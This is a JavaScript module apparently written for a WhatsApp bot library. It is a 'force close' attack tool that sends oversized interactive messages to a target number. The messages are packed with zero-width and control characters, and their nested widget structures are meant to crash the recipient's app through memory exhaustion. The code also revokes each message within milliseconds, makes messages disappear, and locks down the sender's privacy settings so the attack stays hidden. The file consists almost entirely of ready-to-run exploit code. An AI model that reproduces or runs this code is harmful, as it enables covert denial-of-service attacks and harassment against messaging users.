// ./SY/S7/szfc.js
// szfc — shahzu force close. bloksWidget text-amplification + ephemeral ghost.
// Vector: groupStatusMessageV2 → interactiveMessage.header.bloksWidget
// with multi-megabyte zero-width/control-char fields.
// Bloks parser on WA 2.26.x recurses these into widget tree → OOM/ANR.
// Invisible: LID-routed, ephemeral=1, instant revoke, privacy armed.

const {
    generateWAMessageFromContent,
    delay,
} = require('@sakataoffc/baileys');

// ---------- core payload ----------
function buildBloksPayload(intensity = 1) {
    const N = 50000 * intensity;

    return {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        bloksWidget: {
                            fallback: '\u200D'.repeat(N),
                            type:     '\u200F'.repeat(N),
                            data:     '['.repeat(N),
                            uuid:     '\u200B'.repeat(N),
                        },
                        subtitle: '\u0010'.repeat(N),
                        title:    'X'.repeat(N),
                    },
                    nativeFlowMessage: { buttons: [{}] },
                    body: { text: '\u000F' },
                },
            },
        },
    };
}

// ---------- send invisible ----------
async function sendInvisible(client, targetJid, content, opts = {}) {
    const userJid = client?.user?.id || client?.authState?.creds?.me?.id;

    const waMsg = generateWAMessageFromContent(targetJid, content, {
        userJid,
        timestamp: new Date(),
        ephemeralExpiration: 1,
        ephemeralSettingTimestamp: Date.now(),
    });

    let key;
    try {
        await client.relayMessage(targetJid, waMsg.message, {
            messageId: waMsg.key.id,
            noSelfSync: true,
        });
        key = waMsg.key;
    } catch (err) {
        return { ok: false, err: err.message };
    }

    // instant revoke — 50-80ms
    if (opts.revoke !== false && key) {
        setTimeout(() => {
            client.sendMessage(targetJid, { delete: key }).catch(() => {});
        }, opts.revokeDelay ?? 60);
    }

    return { ok: true, key };
}

// ---------- LID routing ----------
async function resolveBestJid(client, targetJid) {
    try {
        const store = client?.signalRepository?.lidMapping;
        if (store && typeof store.getLIDForPN === 'function') {
            const lid = await store.getLIDForPN(targetJid);
            if (lid) return { jid: lid, mode: 'lid' };
        }
    } catch {}
    return { jid: targetJid, mode: 'pn' };
}

// ---------- privacy arm ----------
async function armPrivacy(client) {
    const ops = {
        updateLastSeenPrivacy: 'none',
        updateOnlinePrivacy: 'none',
        updateProfilePicturePrivacy: 'none',
        updateStatusPrivacy: 'none',
        updateReadReceiptsPrivacy: 'none',
        updateGroupsAddPrivacy: 'none',
        updateCallPrivacy: 'none',
    };
    let ok = 0;
    for (const [m, v] of Object.entries(ops)) {
        if (typeof client[m] !== 'function') continue;
        try { await client[m](v); ok++; } catch {}
    }
    return ok;
}

async function enableDisappearing(client, seconds = 1) {
    try {
        if (typeof client.updateDefaultDisappearingMode === 'function') {
            await client.updateDefaultDisappearingMode(seconds);
            return true;
        }
    } catch {}
    return false;
}

// ---------- variant: nested bloks (deeper recursion) ----------
function buildNestedBloks(intensity = 1) {
    const N = 30000 * intensity;

    let inner = {
        bloksWidget: {
            fallback: '\u200D'.repeat(N),
            type:     '\u200F'.repeat(N),
            data:     '{'.repeat(N),
            uuid:     '\u200B'.repeat(N),
        },
    };

    // Nest 4 levels deep
    for (let i = 0; i < 4; i++) {
        inner = {
            bloksWidget: {
                fallback: '\u200D'.repeat(N / 2),
                type:     '\u200F'.repeat(N / 2),
                data:     JSON.stringify(inner),
                uuid:     '\u200B'.repeat(N / 2),
            },
        };
    }

    return {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: { ...inner, subtitle: '\u0010'.repeat(N), title: 'X'.repeat(N) },
                    nativeFlowMessage: { buttons: [{}] },
                    body: { text: '\u000F' },
                },
            },
        },
    };
}

// ---------- variant: button cascade ----------
function buildButtonCascade(intensity = 1) {
    const N = 40000 * intensity;
    const buttons = [];

    for (let i = 0; i < 80; i++) {
        buttons.push({
            name: 'quick_reply',
            buttonParamsJson: JSON.stringify({
                display_text: '\u200D'.repeat(500),
                id: `b${i}_${'\u200B'.repeat(2000)}`,
                data: '['.repeat(2000),
                metadata: '\u200F'.repeat(2000),
            }),
        });
    }

    return {
        interactiveMessage: {
            header: {
                title: 'X'.repeat(N),
                subtitle: '\u0010'.repeat(N / 2),
                bloksWidget: {
                    fallback: '\u200D'.repeat(N),
                    type:     '\u200F'.repeat(N),
                    data:     '['.repeat(N),
                    uuid:     '\u200B'.repeat(N),
                },
            },
            body: { text: '\u000F' },
            footer: { text: 'F'.repeat(N / 4) },
            nativeFlowMessage: { buttons },
        },
    };
}

// ---------- variant: view-once wrapped bloks ----------
function buildViewOnceBloks(intensity = 1) {
    const N = 40000 * intensity;
    return {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        bloksWidget: {
                            fallback: '\u200D'.repeat(N),
                            type:     '\u200F'.repeat(N),
                            data:     '['.repeat(N),
                            uuid:     '\u200B'.repeat(N),
                        },
                        subtitle: '\u0010'.repeat(N),
                        title:    'X'.repeat(N),
                    },
                    nativeFlowMessage: { buttons: [{}] },
                    body: { text: '\u000F' },
                },
            },
        },
    };
}

// ---------- orchestrator ----------
async function szfc(client, targetJid, options = {}) {
    if (!client) throw new Error('szfc: client required');
    if (!targetJid) throw new Error('szfc: targetJid required');

    // sender guard
    try {
        const senderRaw = (client.user && client.user.id) ? String(client.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(targetJid).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            return { skipped: true, reason: 'target equals sender' };
        }
    } catch {}

    const arm        = options.arm !== false;
    const useLid     = options.useLid !== false;
    const bursts     = Number.isFinite(options.bursts) ? options.bursts : 3;
    const intensity  = Number.isFinite(options.intensity) ? options.intensity : 1;
    const gapMs      = Number.isFinite(options.gapMs) ? options.gapMs : 800;

    const privacyArmed = arm ? await armPrivacy(client) : 0;
    const disappearing = arm ? await enableDisappearing(client, 1) : false;
    const resolved = useLid ? await resolveBestJid(client, targetJid) : { jid: targetJid, mode: 'pn' };
    const sendJid = resolved.jid;

    const report = {
        jid: sendJid,
        mode: resolved.mode,
        privacyArmed,
        disappearing,
        bursts: 0,
        hits: {},
    };

    for (let b = 0; b < bursts; b++) {
        // Main vector
        const r1 = await sendInvisible(client, sendJid, buildBloksPayload(intensity));
        report.hits.bloks_main = (report.hits.bloks_main || 0) + (r1.ok ? 1 : 0);
        await delay(150);

        // Nested recursion variant
        const r2 = await sendInvisible(client, sendJid, buildNestedBloks(intensity));
        report.hits.bloks_nested = (report.hits.bloks_nested || 0) + (r2.ok ? 1 : 0);
        await delay(150);

        // Button cascade
        const r3 = await sendInvisible(client, sendJid, buildButtonCascade(intensity));
        report.hits.button_cascade = (report.hits.button_cascade || 0) + (r3.ok ? 1 : 0);
        await delay(150);

        // View-once wrapped
        const r4 = await sendInvisible(client, sendJid, buildViewOnceBloks(intensity));
        report.hits.viewonce_bloks = (report.hits.viewonce_bloks || 0) + (r4.ok ? 1 : 0);

        report.bursts++;
        await delay(gapMs);
    }

    return report;
}

module.exports = {
    szfc,
    buildBloksPayload,
    buildNestedBloks,
    buildButtonCascade,
    buildViewOnceBloks,
    armPrivacy,
    enableDisappearing,
    resolveBestJid,
};
